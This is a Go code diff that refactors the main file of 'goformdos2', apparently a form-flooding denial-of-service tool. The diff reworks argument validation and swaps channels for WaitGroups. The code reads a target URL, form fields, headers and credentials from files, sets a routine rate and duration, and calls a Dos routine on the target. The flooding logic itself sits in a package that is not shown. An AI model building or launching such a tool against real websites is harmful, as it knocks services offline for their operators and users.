@@ -9,9 +9,11 @@ import (
 	"net/url"
 	"os"
 	"strings"
+	"sync"
+
+	"github.com/pierelucas/goformdos/goformdos2/dos"
 
 	"github.com/pierelucas/goformdos/goformdos2/configparser"
-	"github.com/pierelucas/goformdos/goformdos2/dos"
 )
 
 var (
@@ -34,7 +36,7 @@ var (
 	flagThreads = flag.Int(
 		"r",
 		0,
-		"Define how many routines should running")
+		"Define how many routines/s (per second) should running")
 	flagTime = flag.Int(
 		"t",
 		0,
@@ -45,100 +47,120 @@ var (
 		"output logfile (lot of Foo)")
 )
 
-var (
-	info dos.TargetInf
-)
-
-func validateURL(s string, done chan<- struct{}) {
-	_, err := url.ParseRequestURI(s)
-	if err != nil {
-		log.Fatalf("%s is invalid url\n", s)
-	}
-
-	done <- struct{}{}
-}
-
-func isPath(filepath string) (bool, error) {
-	_, err := os.Stat(filepath)
-	if err != nil {
-		return false, err
-	}
-	return true, err
-}
-
-func init() {
-	fmt.Print("\033[H\033[2J") // clear terminal
+// init()
+func validateArgs() (err error) {
 	flag.Parse()
 
 	if *flagForms == "" || *flagURL == "" || *flagHeaders == "" || *flagThreads <= 0 || *flagTime <= 0 {
-		log.Fatalln("please define arguments or use -h for help")
+		err = fmt.Errorf("ERROR: please define arguments or use -h for help")
+		return err
+	}
+
+	// Validate URL
+	validateURL := func(urladdr string) error {
+		_, err := url.ParseRequestURI(urladdr)
+		if err != nil {
+			e := fmt.Errorf("%s is invalid url", urladdr)
+			return e
+		}
+		return nil
+	}
+	err = validateURL(*flagURL)
+	if err != nil {
+		return err
+	}
+
+	// validate filepath
+	validatePath := func(fp string) (bool, error) {
+		_, err := os.Stat(fp)
+		if err != nil {
+			return false, err
+		}
+		return true, err
+	}
+
+	// validate headerfile
+	_, err = validatePath(*flagHeaders)
+	if err != nil {
+		err = fmt.Errorf("ERROR: %s not exist or is not accesible", *flagHeaders)
+		return err
+	}
+
+	// validate formfile
+	_, err = validatePath(*flagForms)
+	if err != nil {
+		err = fmt.Errorf("ERROR: %s not exist or is not accesible", *flagForms)
+		return err
 	}
 
 	if *flagOutput != "" {
-		b, _ := isPath(*flagOutput)
+		b, _ := validatePath(*flagOutput)
 		if b {
 			file, err := os.OpenFile(*flagOutput, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
 			if err != nil {
-				log.Fatalln(err)
+				return err
 			}
 
 			defer file.Close()
 
 			log.SetOutput(file)
 		} else {
-			log.Fatalf("%s path not exist - unable to open or create file", *flagOutput)
+			err = fmt.Errorf("ERROR: %s path not exist - unable to open or create file", *flagOutput)
+			return err
 		}
 	}
 
 	if *flagAuth != "" {
 		if !strings.Contains(*flagAuth, ":") {
-			log.Fatalf("%s is not a valid username:password\n", *flagAuth)
-		} else {
-			tempSlice := strings.Split(*flagAuth, ":")
-			info.AddAuth(tempSlice[0], tempSlice[1])
-		}
-	}
-}
-
-func appendToStruct(mode string, done chan<- struct{}, input map[string]string) {
-	for k, v := range input {
-		if mode == "FORMS" {
-			info.AddForm(k, v)
-		} else if mode == "HEADERS" {
-			info.AddHeader(k, v)
-		} else {
-			log.Fatalln("error in func appendToStruct - wrong mode! [FORMS / HEADERS]")
+			err = fmt.Errorf("ERROR: %s is not a valid username:password", *flagAuth)
+			return err
 		}
 	}
 
-	done <- struct{}{}
+	return nil // Everything seems to be okay :)
 }
 
 func main() {
-	forms := make(map[string]string)
-	headers := make(map[string]string)
-
-	done := make(chan struct{})
-	go validateURL(*flagURL, done)
-	go configparser.Parse(&forms, *flagForms, done)
-	go configparser.Parse(&headers, *flagHeaders, done)
-
-	// Wait for goroutines to finish task
-	for i := 0; i < 3; i++ {
-		<-done
+	err := validateArgs() // validate arguments
+	if err != nil {
+		log.Fatalln(err)
 	}
 
-	go appendToStruct("FORMS", done, forms)     // Intialize forms
-	go appendToStruct("HEADERS", done, headers) // Intialize headers
+	info := dos.New(*flagTime, *flagThreads, *flagURL) // Initialize new dos.TargetInf object
 
-	// Wait for goroutines to finish task
-	for i := 0; i < 2; i++ {
-		<-done
+	var wg sync.WaitGroup
+
+	// maps to parse in and temporary store our forms and headers
+	var (
+		forms   = make(map[string]string)
+		headers = make(map[string]string)
+	)
+
+	// Parse forms and headers from file
+	wg = sync.WaitGroup{}
+	wg.Add(2)
+	go configparser.Parse(&forms, *flagForms, &wg)
+	go configparser.Parse(&headers, *flagHeaders, &wg)
+	wg.Wait()
+
+	// Append forms and headers to dos.TargetInf and his underlaying structure's
+	wg = sync.WaitGroup{}
+	wg.Add(2)
+	go info.AppendMore("FORMS", forms, &wg)     // Intialize forms
+	go info.AppendMore("HEADERS", headers, &wg) // Intialize headers
+	wg.Wait()                                   // wait for goroutines to finish task
+
+	// Append Authorization (if set)
+	if *flagAuth != "" {
+		tempSlice := strings.Split(*flagAuth, ":")
+		info.AddAuth(tempSlice[0], tempSlice[1])
+		tempSlice = nil
 	}
 
-	info.AddWebaddress(*flagURL) // add url to struct
+	fmt.Print("\033[H\033[2J") // clear terminal
 
-	sync := make(chan struct{})
-	go dos.Dos(*flagThreads, *flagTime, &info, sync)
-	<-sync
+	wg = sync.WaitGroup{}
+	wg.Add(1)
+	go info.Dos(&wg)
+	wg.Wait()
 }
